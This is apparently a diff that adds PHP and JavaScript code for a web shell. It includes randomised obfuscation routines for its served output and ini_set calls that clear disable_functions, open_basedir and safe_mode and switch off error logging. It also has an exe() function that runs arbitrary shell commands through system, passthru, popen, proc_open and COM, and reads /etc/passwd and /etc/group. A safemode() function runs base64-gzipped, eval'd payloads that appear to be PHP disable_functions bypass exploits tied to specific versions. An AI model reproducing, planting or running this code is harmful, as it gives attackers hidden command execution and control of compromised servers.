+			
+			if(file.files.length){
+				var reader = new FileReader();
+				
+				reader.onload = function(e){
+						filename = fixFileName(input.value);
+						wwwFile = document.createElement("input");
+						wwwFile.type = "hidden";
+						wwwFile.id = input.name;
+						wwwFile.name = input.name + "["+filename+"]";
+						wwwFile.value = e.target.result;
+						if(e.target.result.length <= 2097152)
+							form.appendChild(wwwFile);
+						else
+							if(confirm("Request size is ~" + Math.round(((e.target.result.length * 2) / 1024) / 1024) + "M, but limits is often around <= 8M. There is no guarantee that the file will be uploaded.\nYou can disable request encoding, use other upload methods or select a smaller file. Continue?"))
+								form.appendChild(wwwFile);
+							else
+								return false;
+							
+						uplFiles();
+						
+						elements = form.getElementsByTagName("*");
+						for(var i = 0; i < elements.length; i++)
+							if(elements[i].type === "hidden")
+								form.removeChild(elements[i]);
+				};
+				
+				reader.readAsDataURL(file.files[0]);
+				return reader;
+			}
+			
+		}
+
+		function deleteAllCookies() {	
+			var cookies = document.cookie.split(";");
+		
+			for (var i = 0; i < cookies.length; i++) {
+				var cookie = cookies[i];
+				var eqPos = cookie.indexOf("=");
+				var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+				document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
+			}
+			
+			return false;
+		}
+	
+		function submitViaCookie(encodedForm, refresh = true){
+			var reqlen = 0;
+			var elements = encodedForm.getElementsByTagName("*");
+			
+			for(i = 0; i < elements.length; i++) {
+				
+				if(!elements[i].name) continue;
+				
+				name = elements[i].name;
+				value = encodeURIComponent(elements[i].value);
+
+				if(value.length > 4095 || reqlen > 7696){
+					if(confirm("The request header is too big, send it via POST?")){
+						deleteAllCookies();
+						return false;
+					}
+					else{
+						deleteAllCookies();
+						return "CANCEL";
+					}
+				}
+				
+				document.cookie =  name + "=" + value;
+				reqlen = reqlen + name.length + value.length;
+			}
+			
+			if(refresh)
+				window.location = window.location.pathname;
+			else
+				return "SEND";
+		}
+		
+		function invertColors() {
+		    var css = "html{-webkit-filter: invert(90%); -moz-filter: invert(90%); -o-filter: invert(90%); -ms-filter: invert(90%);}";
+		    var head = document.getElementsByTagName("head")[0];
+		    var style = document.createElement("style");
+		    if(!window.counter)
+		        window.counter = 1;
+		    else{
+		        window.counter++;
+		        if (window.counter % 2 == 0)
+		            var css = "html{-webkit-filter: invert(0%); -moz-filter: invert(0%); -o-filter: invert(0%); -ms-filter: invert(0%);}"
+		    }
+		    style.type = "text/css";
+		    
+		    if(style.styleSheet)
+		        style.styleSheet.cssText = css;
+		    else
+		        style.appendChild(document.createTextNode(css));
+		        
+		    head.appendChild(style);
+		    
+		    return false;
+		}
+</script>';
+}
+
+function makeOut($str){
+	return (c('<script>').t(f('write', 1).'('.f('decodeURIComponent').'('.f('atob').'(('.i(base64_encode(rawurlencode(c($str, 1))), 100, 400).'))));', true).c('</script>'));
+}
+
+function f($f, $d = false){
+	$r = rand(0,1);
+	return ($r ? (rand(0,1) && !$d ? f('self') : ($r  && !$d ? f('top') : f('document'))).'['.i($f, 1, 3).']' : ($d ? f('document').'.'.$f : $f));
+}
+
+function i($s, $m, $x){
+	$s = str_split($s, rand($m, $x));
+	if($m > 50) $s[0] = trim(i($s[0], 1, 5, true), '"\'');
+	return implode('+', array_map(function($k){$r = date('H') > 12; return ($r ? '"' : '\'').$k.($r ? '"' : '\'');}, $s));
+}
+
+function c($s = '', $n = 0){
+	$r = array('/', '>', '*');
+	return (rand($n, 1) ? '<!--'.str_replace($r, '', j(1)).'-->'.(strlen($s) ? $s.(rand(0, 1) ? '<!--'.str_replace($r, '', j(1)).'-->'."\n" : '') : '') : $s);
+}
+
+function j($a = 0){
+
+	$l = rand(10, 100);
+	while(!isset($c[$l])) @$c .= chr($a ? rand(32, 126) : rand(1, 127));
+	
+	if(rand(0, 1))
+		return "//".str_replace(array("\r","\n"), "", $c)."\n";
+	else
+		return "/*".preg_replace("|\*/|","", $c)."*/";
+}
+
+function t($s, $n = false){
+	if(!function_exists('token_get_all')) return $s;
+	
+	$s = ($n ? '<?php ' : '').$s;
+	
+	foreach(token_get_all($s) as $t)
+		@$r .= (is_array($t) ? $t[1] : $t).j();
+	
+	return ($n ? substr($r, 6) : $r);
+}
+
+function sDie($str = ''){
+	if(RO)
+		die($str);
+	else{
+		$out = ob_get_contents();
+		ob_end_clean();
+	}
+	
+	if(preg_grep('|attachment|', headers_list())) print gzencode($out.$str, 9);
+	else
+		print setValue($out.$str);
+	die;
+}
+
+function safemode($cmd = 'check'){
+	
+	if(!defined('PHP_VERSION_ID')) return false;
+	$c = __FUNCTION__;
+	$v = PHP_VERSION_ID;
+	
+	$pocs['cm_php_fpm'] = array('v' => ((strpos(php_sapi_name(), 'fpm') !== false) && is_int(array_search(true, array_map(function($f){if(function_exists($f)) return true;}, array('mail', 'error_log', 'imap_mail','mb_send_mail'))))), 'r' => 'execFPM($'.$c.')', 'c' =>'eJyNV21T20YQ/kxn+h8ORZmTMopkAyaEhFAGTPBMwK5x0ukkmRtZOmEVWdJIMoG2/Pfu7t35BZu2Mj7f7T63t7valyOZ5VGTFjmT9zI6H1w6djSN3b9+/mnLrmTNjlgSZrV8B2v4SxPHTsopUG9kg2CXkFt2PR2EzQToaZ4K4Dm8lnk8DdNMlMDgLgrYUtDJeZpJgDppLX5UaROOM+lwn7vsmAlx1hsKwQ5Z/VCjINHIaSnitIKjfB5wfxp3nCadSliTTHt6e56FNyAPOVq6T0YQP4GlKGeNiIq8kXlTG4zH+IvtYJzmQT3hvvUtt3z+gnFfC1QUlONz9gHpapuSGk2mRbyQ1HrT6SyZWE5KbaPRh/tA488ppPGg0ftjmLPjD8phJCwqYpTEcbElq6qoRCXLomrS/MZpqVO30O01uN1SgKy4sUCrp0wgCwLUhqv4iZPoKBDyPq1BJaueyCwTGBOW6xLKxMOC41hzr/jc0ocZidtpjWfiJh0kYHpRyTCaOGFVhQ+OheEBiqzobKXTsBSKY03HAsNILV0W1sxGRbU+m/RWfHMe6Ixrp+3BR+sHzxi0uDWrR/p95NoZeB5lAYS5x8azNIsHYXSrop3ehccW78vEhPuOwbO83+THmgzO4TVz3Eop4y6Fjc43jA+M/KcBa97XLM/S/NZZiUdD05oR8VFFUCWbWZUzZ7tuqrKo6Y3A8SrKMefo3EOV57jxEY8xjv3fLmDgc3SCXRIWDGmKGneg861v960WfNv6d+1L0bO83adS0qRhlv4pB2EVTrUwBcNHRdFijQ8fdn/93L0eicvu6KJ/xtkRpO7H7oh7T3DX3eGX7lAMhv1R/7T/SQEvRqNB0Pbba+iPJ6Pubye/i97VqDs8PzntKvzpx95GuBZ+dXKpgVkRhdmkqJs1KB4pLvrXo/8CDruX/VFXnJydDRW0vfPGb8Fnw/Gnw95gJM57n7pzFeYv7Al2cDEAmZe9K/Hl5NNnhf2jSHMHy5+30ce0L8yy4oeYVZlI8yibxfKI+yo4IKJ4P+cQUbyfJNz1NuyO0xqrvjBRVh8hdBOyKGUuxmEtoQU8CwpnTSFKqIpYLDB/VpSJwyY89LgPysociY4us/IuzByUvb8nYkkcqGiaoKEkxcXyBjmOdRntIqOweKx2ueVTTZsDdDCrq6CmRqPR7HXDXqfcXTXFXVrr6YasmGfV3r8xO6pYIFvnv0at5bcpVNTx7yBtMSIgeq97/SusIjZahnVJhQIP7sIqqGZ5AB4MsJaReRS36yxDeAanupx9J6vFAfbd19Z3KCv448PYpnFnEwnH3e9YToNXMHa4xzv+Lo17NCrKPoxv8Ou3aGzTuEPjLo2IPiDuAXEPiHtA3APgvgqUokXZLBRVJOhdeYGNHiZQYLFRc926TbfTHsTuhTOXzRlkONJh4jIS//U7CkOcz/HK4CPP56+hHfl1Ed3yuSKEXFSBw7etVmvtaNIYT4AJtc3FDe4XUFeGU4FSsdtkKTQbh7aAn9k2CA845k8TlYdBQAk9y9N7nLs+wjymzPeM9R5r68uCCTo4SnUtTTCXydUYXG26OlL1zXIiw1jFhz0u4oe5g6llJnCPqp9sI+aPCSSfs53IQtlrrgQ2tEm8TSUQ9mbjXuvtvrkpAVohjpj1rYIS6LKl28JcGUg1whH5UbXl9SO1xv5zxyVRVtRSgbVJJv+N/1DAmrs2NUY7jckFuF6EKJCw+pHTyANLMUlIDI1b+UAdAqrhTGqv0y5QHH3qWKdXlgevF8qng2jXc9rv3++2XfY3M2S1WV/JzW4EP6EQTt9OFmGh6xYZsaeVXr+KLKPs5qGUC/MsSxWw+eWjLqs0bxIHbx7tl9HiQ7cNKt9KBM3SmAVsp7MPAmH6kqZ0m9PWkT4Gskp8DvySHQDR1Ogl3dALCHm3SoPdeK+XYUM6g47OmkBX/1ewuaz/A3c4q58=');
+
+	$pocs['mm0r1_filter'] = array('v' => ($v >= 70000 && $v <= 70234 || $v >= 70300 && $v <= 70333 || $v >= 70400 && $v <= 70425 || $v > 80000 && $v < 80013), 'r' => 'pwn($'.$c.')', 'c' =>  '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');
+	
+	$pocs['mm0r1_concat'] = array('v' => ($v == 80013 && $v == 80014 || $v > 80100 && $v < 80120), 'r' => 'new Pwn($'.$c.')', 'c' =>'eNqtV1tvo0YUfs+vmFrIgpqswE5tJw6pvE20SS/ZNJc+rGuhMQxrEgzWABtnt/7vPTNcPAwQZ6taijwx53zn/s3BCXAco0sSrAlF39A6XQS+gxSsI2UBf84EbQ8cLnPzHKJvBwg+ThTGCfrl8uH6N/t8ej+1764+XSALGZuhMalJ5A8/XVyf2+cX7x8+2O8frn4/Rz+jmATeyYmM0wOcvoFOmh+L+Hf3t1fXHwoDzWiHgGaO4cucHAiql/c7p01zPJEeNQAXGjXAPGVeGjqJH4XItjkOTZ1EVZyVq+VZYx8voqriM6sTBN+nyOSHXk8UYh/lM42i1WxemsdBEDlqdhbc0yZvV6sGJmhuy1N5UCAGByc2xGFj16UlIPzQXycQRbL048OzJcFrOyD4SdV0ZA4FUMXzg+AN7u8UMkS8cL4jaAXECwdrPvcqPZF1j2zOo4SoJYqIXATIJ8NCIXnOx2Qn43sqGAtIqO6c16Cq0CGDwUiuKSVJSkMx7c3GAAbsdQJCks6kTWQBIkXLqcoGbG1bZR3e5h4hrocdIuYgk7CXOHQDQmOWxEyVksCmBLuqUSmRE0RxSkmZcVkYBrdR3iGiNEhWkdjIm4aQ/B3CAse+Y7NIBe8+k8QWHqiCnYr5r75nxy9xQlZV3ew3VQSv6Hn4CbByzMjzeP5GxqR9jlnFx/zcs9C4Ns27PD1TP4GGq1noga7+aooUX2uc2TeBG5vBGAZUR0dii+d1ZzIxSSCcm8sb+4/prx9v7b8ubu+uPl4jy4J4gKtZ/MDJQPHjyfeZlqzoYlnas150WDnfPdQcFyPvdodYR+oN0EIWVHmytIy23wDbgpiGEGcdNhPIp35N/S84IbtrQ2BSoXsUTFkaZrO5jmbz+c4GWLAJpVE5vGrJBhpKY4LULtPVUVdZpF6tITNYU7o9QJJxL/AnJWuCE7Xz98YwOjrad4FUGJnSmTlH7/aQONygOXd2ppTil47Y3RlVcodez1pO3yz/YtbW+CWIsAvBrLHzpHb+/BGCMDYuzNWCEI+dHeyRBV4QKKPM/IX2u2oupi2J2EVSaGqNVPb/lJJ9FWb+Y1ULfSCE/UXsbDqvl6BkfyUbcNGrvI6NqwNMNuQ+19lvIieYkkS+4CBlxQuRRLjAzahKzkrYsmSVjsxyXE6zbHtyluAnN4G67O705EUre3Z2BsZlUm6PgiWJNVuT2w0cYxp5c2ZLp3hB5vYtVN0/ygVCqywpYO0HK7NXaHYtpJro9BSxh/A10DS+0woXSzGEXOH1ArVdqhUmyxldeL5z0o3k2ng2CRP6Iu8N0qzmoiFe1TaMHEBHQ0meJaRQsfhbizv8aXQ0GoyORwO5R8REyH5At4wl7K00kFzK4m80Qpug56UfkNJFXhxD25/iys4jk16GCe8dpM4LvIf4u45Rz4UcFlsS8sxMx6jbreXDD23MKFttysgRU9drOuwz6xvm2BgNYA2B07FxbPTZqW8YxwODn0z221xrKoKyitw0ILxutf1TsJ/voK+py5oycoM6y1MFIWuco1F/aA6PhmRosgZq8ntPA4G74wZ725auqjBMnOBEfPPMblol9r+SJhKGCyBepp4HXSJfa5lOtQNl9JK+4QAaa0awjUTGIiNxzAm4ujE/ssyHGc/AP2cZRT8eHjZ2LMM4Pa0QbOXZPxaKqMv9mYE7QN2P88YNuUh/rlhEuT34F11ikeU=');
+	
+	foreach($pocs as $pocname => $poc)
+	{
+		if(!$poc['v']) continue;
+		
+		switch($cmd){
+			case 'check':
+				return $pocname;
+			break;
+			default:
+				ob_start();
+				eval('$'.$c.' = \'(echo "via '.$pocname.':";'.addslashes($cmd).') 2>&1\';echo '.$poc['r'].';'.gzuncompress(base64_decode($poc['c'])));
+				$res = ob_get_contents();
+				ob_end_clean();
+				
+				if(strpos($res, $pocname)) return $res;
+		}
+	}
+	
+	return (isset($res) ? $c.' for '.$v.' fails ;( ' : false);
+}
+
+#
+#
+#
+
+$ini = array(
+	'disable_classes' => '',
+	'disable_functions' => '',
+	'display_errors' => 0,
+	'enable_post_data_reading' => 1,
+	'error_log' => '',
+	'error_reporting' => 0,
+	'file_uploads' => 1,
+	'log_errors' => 0,
+	'log_errors_max_len' => -1,
+	'magic_quotes_gpc' => 0,
+	'magic_quotes_runtime' => 0,
+	'magic_quotes_sybase' => 0,
+	'max_execution_time' => 0,
+	'memory_limit' => '1024M',
+	'open_basedir' => '',
+	'safe_mode' => 0,
+	'safe_mode_exec_dir' => '');
+
+$sysini = ini_get_all();
+	foreach($ini as $k => $v)
+		if(isset($sysini[$k]) && $sysini[$k]['access'] == 7)
+			ini_set($k, $v);
+	
+scriptInit();
+
+function unQuote($a){
+	foreach($a as $k => $v)
+		if(is_array($v))
+			$a[$k] = unQuote($v);
+		else
+			$a[$k] = stripslashes($v);
+			return $a;
+}
+	
+function prepVals(&$a,$k){
+	foreach($a as $i => $v)
+		if(is_array($v)) prepVals($a[$i],$k);
+		elseif(strlen($v)>2){
+			$r = '';
+			$v = explode($k, $v);
+			for($n = count($v)-1; $n>=0; --$n){
+				$c = array_pop($v);
+				if($c === '')
+					$c = $k;
+				if($n%2 === 0)
+					$r .= $c;
+				else
+					$r = $c.$r;
+			}
+			$a[$i]=$r;
+		}
+}
+
+if(defined('CED'))
+	$D = unserialize(pack('H*', CED));
+else{
+	if(isset($_REQUEST['a']))
+		$D=$_REQUEST;
+	elseif(isset($_REQUEST['a']))
+		$D=$_REQUEST;
+	else
+		$D=array();
+		
+	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc())
+		$D = unQuote($D);
+	
+	if(isset($D['k'])){
+		$k = $D['k'];
+		unset($D['k']);
+		prepVals($D,$k);
+	}
+}
+
+$C = array(''=>'UTF-8','UTF-16','Windows-1250','Windows-1251','Windows-1252','Windows-1254','Windows-1256','Windows-1257','ISO-8859-1','ISO-8859-2','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-13','Big5','GBK','Shift_JIS','EUC-KR','EUC-JP','IBM866','KOI8-R','KOI8-U',);
+
+define('VER', '1.4');
+define('DSC', DIRECTORY_SEPARATOR);
+define('NIX', DSC === '/');
+define('RO', isset($D['ro']) ? true : false);
+define('TM', isset($D['tm']) ? true : false);
+define('CSE', isset($D['c']) ? $C[$D['c']]:'UTF-8');
+
+ob_end_clean();
+if(!RO) ob_start();
+
+if(!defined('CED')){
+	if(isset($D['a'])){
+		$md5 = md5(rand(0, 777777));
+		if(isset($D['d'])){
+			if($D['a']==='f'){
+				if(is_array($D['d'])){
+						$D['DBP'] = samePath($D['d']);
+						$n = $md5.'.zip';
+					}
+					elseif(is_dir($D['d']))
+						$n = $md5.'.zip';
+					else
+						$n = fileName($D['d']);
+						$n = escFileName($n);
+			}
+			else
+				$n = $md5.'.zip';
+				
+			header('Content-Type: application/octet-stream');
+			header('Content-Disposition: attachment; filename="'.$n.(RO ? '' : '.gz').'"');
+		}
+		else{
+			header('Content-Type: application/json; charset='.CSE);
+		}
+	}
+	else
+		header('Content-Type: text/html; charset='.CSE);		
+}
+					
+function escHTML($v){
+	return str_replace(array('&','"','<','>'), array('&amp;','&quot;','&lt;','&gt;'), $v);
+}
+
+function selfPath(){
+	if(isset($_SERVER['SCRIPT_FILENAME'])) return filePath($_SERVER['SCRIPT_FILENAME']);
+	if(isset($_SERVER['DOCUMENT_ROOT'])) return substr($_SERVER['DOCUMENT_ROOT'],-1) === DSC ? $_SERVER['DOCUMENT_ROOT'] : $_SERVER['DOCUMENT_ROOT'].DSC;
+	if(PHP_VERSION >= '5.3') return substr(__DIR__,-1) === DSC ? __DIR__ : __DIR__.DSC;
+	return filePath(__FILE__);
+}
+
+function filePath($p){
+	$p = rtrim($p, DSC);
+	return implode(DSC, array_slice(explode(DSC,$p), 0, -1)).DSC;
+}
+
+function fileName($p){
+	$p=rtrim($p, DSC);
+	$i=strrpos($p, DSC);
+	return $i=== FALSE ? $p : substr($p,$i+1);
+}
+
+function writeFile($p,$c){
+	if($v = fopen($p,'wb')){
+		flock($v,LOCK_EX);
+		fwrite($v,$c);
+		fflush($v);
+		flock($v,LOCK_UN);
+		fclose($v);
+		return TRUE;
+	}
+
+	if(PHP_VERSION>='5'){
+		$v = file_put_contents($p,$c);
+		if(is_int($v)) return TRUE;
+	}
+
+	if(PHP_VERSION>='5') : if(PHP_VERSION>='5.1'){
+		try{
+			$v = new SplFileObject($p,'wb');
+		}
+		catch(Exception $e ){
+			$v=FALSE;
+		}
+	
+		if($v){
+			$v->flock(LOCK_EX);
+			$v->fwrite($c);
+			$v->fflush();
+			$v->flock(LOCK_UN);
+			unset($v);
+			return TRUE;
+		}
+	}
+	endif;
+	
+	return FALSE;
+}
+
+function tempName(){
+	$a = 'poiuytrewqlkjhgfdsamnbvcxzMNBVCXZLKJHGFDSAPOIUYTREWQ0987654321';
+	$v = '.';
+	for($i = 0; $i < 8; ++$i) $v .= $a[rand(0,61)];
+	return $v.'.tmp';
+}
+
+function tempFile($v){
+	if(($n = tempnam(NIX ? '/tmp' : 'c:\\Temp', '')) && (writeFile($n, $v))) return $n;
+	$a = array('upload_tmp_dir','session.save_path','user_dir','doc_root');
+	
+	foreach($a as $k)
+		if($n = ini_get($k)){
+			$n .= DSC.tempName();
+			if(writeFile($n, $v)) return $n;
+		}
+		
+		$n = selfPath().tempName();
+		
+		if(writeFile($n, $v)) return $n;
+	
+	return FALSE;
+}
+
+function getFile($p){
+	$v = NULL;
+	
+	if($v = fopen($p,'rb')){
+		$r = '';
+		while(!feof($v)) $r .= fread($v, 1048576);
+		fclose($v);
+		return $r;
+	}
+	
+	if(PHP_VERSION >= '4.3'){
+		$v = file_get_contents($p);
+		if(is_string($v)) return $v;
+	}
+	
+	$v = file($p);
+	if(is_array($v)) return implode('',$v);
+	
+	if(PHP_VERSION>='5') : if(PHP_VERSION>='5.1'){
+		try{
+			$v = new SplFileObject($p,'rb');
+		}
+		catch(Exception $e){
+			$v = FALSE;
+		}
+	
+		if($v){
+			$r = '';
+			while(!$v->eof()) $r .= $v->fgets();
+			unset($v);
+			return$r;
+		}
+	}
+	endif;
+	
+	if(RO && defined('FORCE_GZIP')){
+		if($v = gzopen($p)){
+			$r='';
+			while(!gzeof($v)) $r .= gzread($v, 1048576);
+			gzclose($v);
+			return $r;
+		}
+		$v = gzfile($p);
+		if(is_array($v)) return implode('',$v);
+	}
+	
+	if(RO && $v=ob_start()){
+		if(is_int(readfile($p)) || copy($p, 'php://output') || (defined('FORCE_GZIP') && is_int(readgzfile($p)))){
+			$r = ob_get_contents();
+			ob_end_clean();
+			return $r;
+		}
+		ob_end_clean();
+	}
+	
+	return FALSE;
+}
+
+function delFile($p){
+	return (unlink($p) || (NIX && rename($p,'/dev/null') && !is_file($p) && !file_exists($p)));
+}
+
+function nesc($v){
+	return "'".str_replace("'", '\'"\'"\'', $v)."'";
+}
+
+function wesc($v){
+	return str_replace(array('^', '&', '\\', '<', '>', '|'), array('^^', '^&', '^\\', '^<', '^>', '^|'), $v);
+}
+
+function exe($cmd, $fnc, $sh = '', $se = TRUE, $or = '') {
+	$se = '2>' . ($se ? '&1' : (NIX ? '/dev/null' : 'nul')) . $or;
+	if (NIX)
+		$sc = 'echo ' . nesc($cmd) . '|' . ($sh === '' ? '$0' : $sh) . ' ' . $se . ' & exit';
+	else
+		$sc = ($sh === '' ? '(' . $cmd . ')' : $sh . ' /C ' . wesc($cmd) . ' ') . $se;
+	switch ($fnc) {
+		case 0:
+			system($sc);
+			break;
+		case 1:
+			passthru($sc);
+			break;
+		case 2:
+			echo `$sc`;
+			break;
+		case 3:
+			echo shell_exec($sc);
+			break;
+		case 4:
+			$r = NULL;
+			exec($sc, $r);
+			if (is_array($r))
+				foreach ($r as $v)
+					echo $v, "\n";
+			break;
+		case 5:
+			if ($h = popen($sc, 'r')) {
+				while (!feof($h))
+					echo fread($h, 1024);
+				pclose($h);
+			}
+			break;
+		case 6:
+			if($h = proc_open($sc,array(array('pipe','r'), array('pipe','w'), array('pipe','a')),$p)){
+				echo stream_get_contents($p[1]);
+				fclose($p[0]);
+				fclose($p[1]);
+				proc_close($h);
+			}
+			break;
+		case 7:
+			if ($h = new COM('WScript.Shell'))
+				echo $h->Exec(($sh === '' ? 'cmd' : $sh) . ' /C ' . $cmd . ' ' . $se)->StdOut->ReadAll();
+			break;
+		case 101:
+			echo safemode($cmd);
+	}
+}
+
+
+function uName($id){
+	if($id === -1) return'?';
+	
+	static $a = NULL, $f = FALSE;
+	
+	if($a === NULL){
+		if($v = getFile('/etc/passwd')){
+			$a = array();
+			$v = explode("\n", $v);
+			foreach($v as $i)
+				if($i){
+					$i = explode(':',$i,4);
+					$a[$i[2]]=$i[0];
+				}
+		}
+		elseif(defined('POSIX_F_OK') || function_exists('posix_getpwuid'))
+			$f = (bool)posix_getpwuid(0);
+	}
+	
+	if($a)
+		if(isset($a[$id])) return $a[$id];
+	elseif($f)
+		if($v = posix_getpwuid($id)) return $v['name'];
+	
+	return $id;
+}
+
+function gName($id){
+	if($id === -1) return'?';
+	
+	static $a = NULL, $f = FALSE;
+	
+	if($a === NULL){
+		if($v = getFile('/etc/group')){
+			$a = array();
+			$v = explode("\n",$v);
+			foreach($v as$i)
+				if($i){
+					$i = explode(':', $i, 4);
+					$a[$i[2]] = $i[0];
+				}
+		}
+		elseif(defined('POSIX_F_OK') || function_exists('posix_getgrgid')) $f = (bool)posix_getgrgid(0);
+	}
+
+	if($a)
+		if(isset($a[$id])) return $a[$id];
+	elseif($f)
+		if($v = posix_getgrgid($id)) return $v['name'];
+	
+	return$id;
+
+}
+
+function getINI($s, &$v){
+	$v = trim(ini_get($s));
+	return $v!=='';
+}
+
+function isINI($v){
+	$v = strtolower(trim(ini_get($v)));
+	return ($v === '1' || $v === 'on');
+}
+
+function samePath($a){
+	$p = NULL;
+	foreach($a as $v){
+		$v = array_slice(explode(DSC, rtrim($v,DSC)), 0, -1);
+		if($p === NULL) $p = $v;
+		else{
+			$k=array();
+			$c=count($p);
+			$i=count($v);
+			if($i < $c) $c=$i;
+			for($i=0; $i < $c; ++$i)
+			if($p[$i] === $v[$i]) $k[] = $p[$i];
+			else
+				break;
+			$p = $k;
+			if($i===0) break;
+			}
+	}
+	
+	return count($p) === 0 ? '': implode(DSC, $p).DSC;
+}
+
+function escFileName($v){
+	return str_replace(array('%','/','\\',':','*','?','"','<','>','|'), array('%25',"\xe2\x95\xb1","\xe2\x95\xb2","\xea\x9e\x89","\xe2\x88\x97", '%3F', "\xe2\x80\x9f", '%3C', '%3E',"\xe2\x88\xa3"), $v);
+}
+
+function infMain($h = FALSE){
+	echo $h ? '<table id="tblInf"><tr title="HTTP Host, Server Addr, Server Name, Host Name, Host IP"><th>' : '[{"','Address', $h ? '</th><td>' : '":';
+	$a = array();
+	
+	foreach(array('HTTP_HOST','SERVER_ADDR','SERVER_NAME') as $v)
+		if(isset($_SERVER[$v])){
+			$v = trim($_SERVER[$v]);
+			if($v!==''&&!in_array($v,$a))$a[]=$v;
+		}
+		
+		if($v = php_uname('n')){
+			$v = trim($v);
+			if($v !== '' && !in_array($v,$a)) $a[] = $v;
+		}
+		
+		if(PHP_VERSION>='5.3' && ($v = gethostname())){
+			$v = trim($v);
+			if($v !== '' && !in_array($v,$a)) $a[] = $v;
+		}
+		
+		$r='';
+		foreach($a as $k => $v){
+			if($k > 0) $r.=' / ';
+			$r .= $v;
+			if($i=gethostbynamel($v)){
+				$b = FALSE;
+				foreach($i as $v)
+					if(!in_array($v, $a)){
+						$a[] = $v;
+						if($b) $r .= ', ';
+						else{$b = TRUE; $r .= ' (';} $r .= $v;
+					}
+					
+					if($b) $r .= ')';
+			}
+			elseif(($i = gethostbyname($v)) && !in_array($v, $a)){
+				$a[] = $v;
+				$r .= ' ('.$v.')';
+			}
+		}
+		
+		if($h) echo escHTML($r);
+		else jsonEcho($r);
+		
+		echo $h ? '</td></tr><tr><th>' : ',"','System', $h ? '</th><td>' : '":';
+		
+		$r = '';
+		if(($v = trim(php_uname('s').' '.php_uname('r').' '.php_uname('v').' '.php_uname('m'))) !== '') $r = $v;
+		elseif(NIX && ($v = getFile('/proc/version'))) $r = $v;
+		else{
+			if(defined('PHP_OS')) $r = PHP_OS;
+			else $r = NIX ? '*NIX' : 'Windows';
+			
+			if(!NIX){
+				$a = array();
+				foreach(array('PHP_WINDOWS_VERSION_MAJOR','PHP_WINDOWS_VERSION_MINOR','PHP_WINDOWS_VERSION_BUILD') as $v) if(defined($v)) $a[] = constant($v);
+				
+				if($a) $r .=' '.implode('.', $a);
